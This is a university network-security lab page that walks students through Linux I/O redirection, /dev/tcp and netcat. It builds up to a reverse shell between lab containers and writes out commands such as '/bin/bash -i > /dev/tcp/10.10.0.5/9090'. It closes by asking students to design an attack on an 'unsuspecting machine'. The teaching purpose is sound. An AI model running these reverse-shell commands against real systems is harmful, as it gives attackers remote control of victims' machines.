---
layout: page
title: Reverse shell setup
last_modified_date: Thu Jan 11 11:20:38 2024
current_term: Winter 2023-24
nav_order: 10
parent: Concepts
description: >-
  Instructions for creating a reverse shell in Linux.
---

## Table of contents
{:.no_toc}

1. TOC
{:toc}

---

# Introduction

In this concept lab, we set out to investigate how to set up a reverse shell in
a Linux environment. We will look a bit at how files are handled and see how we
can use that to create a reverse shell from one machine to another.

# Learning objectives

At the end of this concept lab, you should be able:

- Define how input and output redirection works in Linux.
- Create TCP connection without specifically creating a server.
- Explore creating a reverse shell in Linux over a TCP connection.

# Logistics

## Getting the configuration

To start with this concept lab, login to the class server, and navigate to your
`netsec-labs-username` directory. Grab the latest updates using:

  ```shell
  (class-server) $ git fetch upstream
  (class-server) $ git pull upstream main
  ```

A folder called `revshell` should show up in your directory, that is where you
will do most of your lab.

## Patching the docker file

{:.warning}
Before starting here, please make sure that your experiments from all other
labs are down.  To do so, navigate back to the latest lab directory and do
`docker compose down`.

I have updated the patch script to no longer ask you for your username and
subnet, it will try to extract those on its own and print out your subnet (it
is the same on as the one announced on the Moodle page). Also, it now generates
scripts for you to connect to your hosts quickly.

To do so, in the `tcplab` directory, run the patch script:

  ```sh
  (class-server) $ ./patch_docker_compose.sh
  Attempting to fetch subnet automatically...
  Found your subnet, it is 10.10.0
  Done...
  ```

If you had already patched your script, you will see something like this:

  ```sh
  (class-server) $ ./patch_docker_compose.sh
  Attempting to fetch subnet automatically...
  Found your subnet, it is 10.10.0
  [ERROR] ########################################################################
  [ERROR] # It looks like your docker-compose.yml file has already been patched. #
  [ERROR] #                                                                      #
  [ERROR] # If you are having issues bringing up the environment, it means it is #
  [ERROR] #  still in use.                                                       #
  [ERROR] #                                                                      #
  [ERROR] # Try to take down the experiment first, then bring it up again.       #
  [ERROR] #  To bring it down: docker compose down                               #
  [ERROR] #  To bring it up:   docker compose up -d                              #
  [ERROR] ########################################################################
  ```

If for some reason, the script fails to find your subnet, you can override its
behavior by providing your subnet on the command line:

  ```sh
  (class-server) $ ./patch_docker_compose.sh SUBNET
  ```

If all goes well, you should also see two new files in your directory:
`connct_client.sh` and `connect_server.sh`. You can use these scripts to
directly connect to the desired host, without having to type the whole `docker
container exec -it` command. Finally, I have also adjust the container's
hostnames to make it easier for you to identify which is which.

For example, to connect to `client`, you can use:

  ```sh
	$ ./connect_client.sh
  ┌──(root㉿client)-[/]
  └─#
  ```

Hopefully, that would make things a bit easier for you.

{:.highlight}
If you are unable to execute a script due to a permissions issue, then try the
following `$ chmod +x <script name.sh>` to make it executable and try again.

{:.warning}
In the remainder of this document, I will not be using your specific prefixes
and subnets. For example, when I refer to `client`, you should replace that with
`user-client` where `user` is your RHIT username. Similarly, I will be using
`10.10.0` as the default subnet, you should replace that in all IP addresses
with your own subnet. For example, if your subnet is `10.11.0`, then replace the
IP address `10.10.0.1` with `10.11.0.1`.

---

# Experiment 1: Process files

Under the volumes directory, you will find a `src/` directory that contains a
simple program that prints out a message with its process id, and then enters
an infinite loop.

In either of the containers, compile and run this code using:

```sh
$ make
$ ./simple_loop.bin
[./simple_loop.bin] Running process with pid = 26...
My file descriptors are the following:
  stdin:  0
  stdout: 1
  stderr: 2
```
The process id in your case will be different, make not of that value. This is
the id of that program when it is running, i.e., when it is a process in the
container. We would like to check out the files that this process has access
to.

If you look at the source code (pasted below), you can see that the process,
after printing its process id, prints out the values for each of its default
open files:
  1. The standard input: `stdin`.
  2. The standard output: `stdout`.
  3. The standard error: `stderr`.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(int argc, char **argv) {
  printf("[%s] Running process with pid = %d...\n", argv[0], getpid());

  printf("My file descriptors are the following:\n");
  printf("\t stdin:  %d\n", STDIN_FILENO);
  printf("\t stdout: %d\n", STDOUT_FILENO);
  printf("\t stderr: %d\n", STDERR_FILENO);

  while(1);

  exit(0);
}
```

Let's examine the actual files that these descriptors correspond to. To do so,
make can make use of `procfs`, a virtual file system that allows us to read
information about our processes. On the same container, while the program is
still running, grab another terminal and check out the process's files:

```sh
$ ls -al /proc/26/fd
```

This will print out where each of those files (`stdin`, `stdout`, and `stderr`)
are mapped. For my case, it was something like the following:

```
lrwx------ 1 root root 64 Jan 11 16:42 0 -> /dev/pts/1
lrwx------ 1 root root 64 Jan 11 16:42 1 -> /dev/pts/1
lrwx------ 1 root root 64 Jan 11 16:42 2 -> /dev/pts/1
```

## Question sheet

By looking at those value, answer the following question.

1. Where do you think `/dev/pts/1` points to?
  - _Hint_: Think of the normal behavior of any program, where do you read
    input from, where does your standard output and error go to?

## Kill the program

You can now kill the running program using `C-c` on the terminal it is running
into.

# Experiment 2: Redirection

Next, let's play around with these values and see where we can redirect them.
Using the same source code, let's first create a simple plaintext file that
contains any garbage data you like. You can do that quickly using `touch
input.txt`, this will create an empty file called `input.txt`.

Then, run the `simple_loop.bin` with the following command:

```sh
$ ./simple_loop.bin 0<
```

Based on the value of the process id, examine the file mappings for the newly
created process.

## Question sheet

After observing the file descriptor mappings for the process, answer the
following questions:

1. Where is `stdin` mapped for the process?

2. What do you think the `0<` syntax did when running `simple_loop.bin`?

# Experiment 3: Redirection part 2

Let's do one more experiment with redirection. Run our simple program as
follows:

```sh
$ ./simple_loop.bin 1> output.txt
```

It is okay if you do not see any output show up on the console when you launch
this command. To find the process id of this program, you can ask the kernel
for it using:

```sh
$ pidof simple_loop.bin
```
It should give you the process id you are looking for.

## Question sheet

Before you look at the file mappings, first, examine the content of the file
`output.txt`. Based on your observations, answer the following question:

1. Based on what we have seen in the previous experiment, what do you think the
   file mappings would be now?

After answering the previous question, examine the file mappings for that
process, and confirm whether your expectations were correct. Then answer the
following question:

1. By combining your observations from experiments 2 and 3, can you suggest a
   method to map the standard error (`stderr`) of the process into a separate
   file? Write down such a command.
   - _Hint_: Feel free to experiment a bit and check out the mappings using the
    same techniques we did above.

# Experiment 4: Full on redirection

Next, we will examine what we can do if we'd like to map different files to
the same location (i.e., we'd like `stdin` to read from the same file that
`stdout` outputs to).

Run `simple_loop.bin` with the following command:
```sh
$ ./simple_loop.bin > output.txt 0<&1
```

## Question sheet

Examine the file mappings for the running process, and answer the following
questions:

1. Where are `stdin` and `stdout` mapped in this case?

2. Based on that, what do you think the syntax `0<&1` is doing?

3. Can you suggest a command that will redirect all of `stdin`, `stdout`, and
   `stderr` to the same file (e.g., `output.txt`)?

# Experiment 5: Redirection to the outside of a machine

Now, check out the code in `simple_prompt.c`, it simply asks the user to enter
a message, and then print out that message on the console. You can compile it
using `make` and run it using `./simple_prompt.bin`. Give it a shot and play
around with it a bit.

## Experiment 5.1: Input redirection with prompts

Using what we have done in the previous experiments, can you suggest a command
for `simple_prompt.bin` to read its input from a file (say `input.txt`) instead
of the waiting for the user to enter it from the command line?

1. Please write down your command in the question sheet.

## Experiment 5.2: `/dev/tcp`

In this experiment, we'd like to explore the `/dev/tcp` pseudo file. Much like
`/proc`, Linux provides use with a pseudo file under `/dev/tcp` that allows you
to set up a TCP connection to a remote machine, and then redirect your standard
input, output, and error to that TCP connection.

Let's exploit this fact to implement `netcat` without actually having `netcat`
available for us. Grab two terminal windows, one running on the server
container, and another running on the client container.

On the server, start a `netcat` server using:
```sh
$ nc -n -v -l 9090
```
This will start listening for incoming TCP connections on port 9090.

On the client machine, let's send a message to this `netcat` server without
actually using the `nc` command. To do so, use the following command:

```sh
$ echo 'Hello' > /dev/tcp/10.10.0.5/9090
```

{:.warning}
Make sure to replace `10.10.0.5` with the IP of your own server machine.

## Question sheet

Observe what happens when the command above executes, and answer the following
questions:

1. Explain what `echo 'Hello' > /dev/tcp/10.10.0.5/9090` did when you ran it?
   What do you think the `/dev/tcp` pseudo file is used for?

# Experiment 6: Some bash fun

Now, let's make things a bit more fun. Using the same setup, start a netcat
server on the server machine using:

```sh
$ nc -n -v -l 9090
```

However, on the client side, run the following command:

```sh
$ /bin/bash -i > /dev/tcp/10.10.0.5/9090
```

You will notice that you are still in bash, however, a new instance of `bash`
has been created in interactive mode.

## Question sheet

Before you test any commands, answer the following question:

1. By looking at the command on the client, where do you expect the output of
   your commands to show up?

Next, let's confirm your intuition, try to list the files in the current
directory using `ls` on the client machine. Where does the output show up?

## A bit more fun

On the client machine, start a `vim` session. You will receive a warning from
`vim` that the output is funky, ignore that. A few moment later, `vim` will
**show up on the server** container all the while allowing you to edit and enter
command **from the client** container.

We have just offloaded the rendering of the `vim` session to the server all the
while doing the editing commands on the client container.

Try it out with a few other commands, then when you are ready, kill both
sessions at the server and the client. You might need to manually force the
server to exit using `C-c` on the server for the connection to be dropped
(though it depends on which commands you have tried).

## Optional: `simple_prompt` using remote input

This experiment is optional, though it might be helpful with the last
experiment. On the server container, launch a `netcat` server using:

```sh
$ nc -n -v -l 9090
```

On the client container, launch the `simple_prompt.bin` program while asking it
to read the input from the **server connection**.

```sh
$ ./simple_prompt.bin 0< /dev/tcp/10.10.0.5/9090
```

The client's program will hang waiting for input, however try as you can you
will not be able to provide it with input. However, switch to the server
container, on the same terminal that is running the `netcat` server, and type
`hello` and `<Enter>` there, you will see that this message will be sent out to
the client's `simple_prompt.bin` program, thus unlocking it and causing it to
print out its message.

# Final experiment: Reverse shell

Our goal here is to have the client give the server a root shell, allowing it
full control over its machine. That is eventually the exploit that we'd like to
create.

Starting with the same setup, start a `netcat` server on the server container
using:
```sh
$ nc -n -v -l 9090
```

On the client, design a command that will allow you to create a new client
shell **but on the server machine**. In other words, what we'd like to happen
is that after launching this command, the server will find itself with a full
blown root shell running on the client, doing whatever it likes to that client.

## Question sheet

1. Write down the command you used to establish a client root shell on the
   server container.

2. Given what we have discussed in the TCP concept lab and the vulnerabilities
   in TCP, can you design an exploit that allows you to perform such an attack
   on an unsuspecting machine?

